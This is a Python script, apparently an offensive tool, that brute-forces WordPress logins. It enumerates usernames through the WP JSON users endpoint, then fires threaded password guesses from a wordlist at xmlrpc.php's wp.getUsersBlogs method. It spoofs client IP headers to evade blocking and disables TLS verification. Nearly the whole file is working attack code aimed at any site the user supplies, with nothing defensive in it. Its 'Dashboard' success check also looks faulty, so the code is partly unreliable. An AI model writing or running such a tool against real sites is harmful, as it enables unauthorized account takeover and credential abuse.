import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
from termcolor import colored
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

AUTHOR = "Trix Cyrus"
COPYRIGHT = "Copyright © 2025 Trixsec Org"

def print_banner():
    banner = r"""
██████╗ ██████╗ ██╗   ██╗████████╗███████╗   ██╗  ██╗███╗   ███╗██╗     ██████╗ ██████╗  ██████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝   ╚██╗██╔╝████╗ ████║██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗╚███╔╝ ██╔████╔██║██║     ██████╔╝██████╔╝██║     
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝██╔██╗ ██║╚██╔╝██║██║     ██╔══██╗██╔═══╝ ██║     
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗   ██╔╝ ██╗██║ ╚═╝ ██║███████╗██║  ██║██║     ╚██████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝
    """
    print(colored(banner, 'cyan'))
    print(colored(f"Made by {AUTHOR}", 'yellow'))
    print(colored(COPYRIGHT, 'yellow'))

def print_colored_bold(text, color=Fore.GREEN):
    print(colored(text, color, attrs=['bold']))

def generate_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def set_custom_headers():
    return {
        'Content-Type': 'text/xml',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'X-Forwarded-For': generate_random_ip(),
        'X-Real-IP': generate_random_ip(),
        'Referer': 'https://google.com',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br'
    }

def check_xmlrpc_available(url):
    headers = set_custom_headers()
    data = """
    <methodCall>
        <methodName>system.multicall</methodName>
        <params></params>
    </methodCall>
    """
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=5, verify=False)
        if response.status_code == 200 and "faultCode" not in response.text:
            return True
        return False
    except requests.RequestException:
        return False

def get_wp_users(url):
    headers = set_custom_headers()
    api_url = url + "/wp-json/wp/v2/users"
    response = requests.get(api_url, headers=headers, verify=False)
    if response.status_code == 200:
        users = [user['slug'] for user in response.json()]
        return users
    else:
        print(f"{Fore.RED}Failed to fetch users. Status code: {response.status_code}")
        return []

def brute_force_login(url, username, password):
    headers = set_custom_headers()
    data = f"""
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{username}</string></value></param>
            <param><value><string>{password}</string></value></param>
        </params>
    </methodCall>
    """
    response = requests.post(url, data=data, headers=headers, verify=False)
    return response

def brute_force_thread(url, usernames, passwords, threads):
    total_attempts = 0
    start_time = time.time()

    def attempt_login(username, password):
        nonlocal total_attempts
        response = brute_force_login(url, username, password)
        total_attempts += 1
        if "Dashboard" in response.text:  
            print(f"\n{Fore.GREEN}Login successful with {username}:{password}")
            return True
        return False

    def display_progress():
        nonlocal total_attempts
        elapsed_time = time.time() - start_time
        minutes, seconds = divmod(int(elapsed_time), 60)
        attempts_per_second = total_attempts / (elapsed_time if elapsed_time > 0 else 1)
        print(f"\r{Fore.CYAN}Passwords Checked: {total_attempts} | Elapsed: {minutes:02}:{seconds:02} | Attempts/second: {attempts_per_second:.2f}", end='')

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(attempt_login, username, password))

        while any(future.running() for future in futures):
            display_progress()
            time.sleep(0.1) 

        for future in futures:
            future.result()

def start_bruteforce():
    print_banner()
    url = input(f"{Fore.YELLOW}Enter the target WordPress website URL (e.g., https://example.com): ")
    
    if check_xmlrpc_available(url + "/xmlrpc.php"):
        print_colored_bold(f"{Fore.GREEN}xmlrpc.php is available, proceeding with brute-force!", color='green')
    else:
        print(f"{Fore.RED}xmlrpc.php is not available. Exiting...")
        return

    use_wp_api = input(f"{Fore.YELLOW}Do you want to list users from WP JSON API? (y/n): ").lower()

    if use_wp_api == 'y':
        users = get_wp_users(url)
        if users:
            print(f"{Fore.CYAN}Found users: {', '.join(users)}")
        else:
            print(f"{Fore.RED}No users found from WP API.")
            return
    else:
        username_choice = input(f"{Fore.YELLOW}Do you want to provide a username file or enter manually? (f/m): ").lower()
        if username_choice == 'f':
            username_file = input(f"{Fore.YELLOW}Enter the path to the username file: ")
            with open(username_file, 'r') as file:
                users = [line.strip() for line in file.readlines()]
        else:
            users = [input(f"{Fore.YELLOW}Enter a username: ")]

    password_choice = input(f"{Fore.YELLOW}Do you want to provide a password file or use default (wppass.txt)? (f/d): ").lower()
    if password_choice == 'f':
        password_file = input(f"{Fore.YELLOW}Enter the path to the password file: ")
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    else:
        if os.path.exists("wppass.txt"):
            with open("wppass.txt", 'r') as file:
                passwords = [line.strip() for line in file.readlines()]
        else:
            print(f"{Fore.RED}Default password file (wppass.txt) not found. Exiting...")
            return

    threads = int(input(f"{Fore.YELLOW}Enter the number of threads to use: "))

    brute_force_thread(url + "/xmlrpc.php", users, passwords, threads)

if __name__ == "__main__":
    start_bruteforce()